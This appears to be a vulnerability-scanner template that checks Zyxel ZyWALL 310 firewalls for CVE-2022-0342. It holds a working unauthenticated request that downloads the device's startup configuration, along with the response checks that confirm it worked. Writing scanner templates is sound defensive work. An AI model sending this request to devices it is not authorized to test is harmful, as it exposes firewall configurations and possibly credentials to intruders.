name: yaml-poc-zyxel-zywall_310-unauthorized_access-CVE-2022-0342
binding: a92da157-99e9-4bdd-ae13-90999fcd3ffe
detail:
    author: system_user
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-0342/
        - https://www.cybersecurity-help.cz/vdb/SB2022033003
        - https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml
    vulnerability:
        id: ece5377f-9b64-4d42-b30f-a8b5e0b99c15
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/export-cgi?category=config&arg0=startup-config.conf
        expression: response.status == 200 && response.body.bcontains(b"interface-name") && response.headers["Content-Type"].contains("text/zyxel")
expression: r0()
